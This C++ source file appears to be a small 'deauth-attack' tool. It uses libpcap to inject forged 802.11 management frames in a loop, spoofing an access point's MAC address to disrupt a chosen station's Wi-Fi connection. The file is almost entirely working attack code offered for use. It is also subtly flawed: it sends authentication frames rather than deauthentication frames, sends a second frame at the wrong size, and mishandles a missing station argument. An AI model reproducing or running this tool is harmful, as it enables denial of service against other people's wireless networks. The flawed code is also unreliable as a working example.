#include <iostream>
#include <pcap.h>
#include <cstdio>
#include "mac.h"
#include "auth.h"
#include "assoc.h"
#include <unistd.h>

using namespace std;

void usage() {
    cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>]" << endl;
    cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << endl;
}

int send_deauthpacket(char *dev, char *apmac, char *stmac, int argc) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "Couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    struct authpacket packet;

    packet.radio.version = 0x00;
    packet.radio.pad = 0x00;
    packet.radio.len = 0x08;
    packet.radio.present = 0x00;
    packet.auth.fc = 0xb0;
    packet.auth.dur = 0x00;
    packet.auth.seq = 0x00;
    packet.wireless.auth_algorithm = 0x00;
    packet.wireless.auth_seq = 0x01;
    packet.wireless.status = 0x00;
    packet.wireless.tag_num = 0xdd;
    packet.wireless.tag_len = 0x09;
    uint8_t oui[3] = {0x00, 0x10, 0x18};
    memcpy(packet.wireless.oui, oui, 3);
    uint8_t vendor[6] = {0x02, 0x00, 0x00, 0x10, 0x00, 0x00};
    memcpy(packet.wireless.vendor, vendor, 6);

    struct assocpacket packet2;

    packet2.radio.version = 0x00;
    packet2.radio.pad = 0x00;
    packet2.radio.len = 0x08;
    packet2.radio.present = 0x00;
    packet2.assoc.fc = 0x01;
    packet2.assoc.dur = 0x00;
    packet2.assoc.seq = 0x00;
    packet2.wireles.cap = 0x00;

    while (true) {
            packet.auth.dest = Mac(stmac);
            packet.auth.source = Mac(apmac);
            packet.auth.bssid = Mac(apmac);
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(authpacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                break;
            }
            int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet2), sizeof(authpacket));
            if (res2 != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                break;
            }
            sleep(1);
    }

    pcap_close(handle);

    return 0;
}

int main(int argc, char *argv[]) {
    if (argc < 3 || argc > 4) {
        usage();
        return -1;
    }
    send_deauthpacket(argv[1], argv[2], argv[3], argc);
}
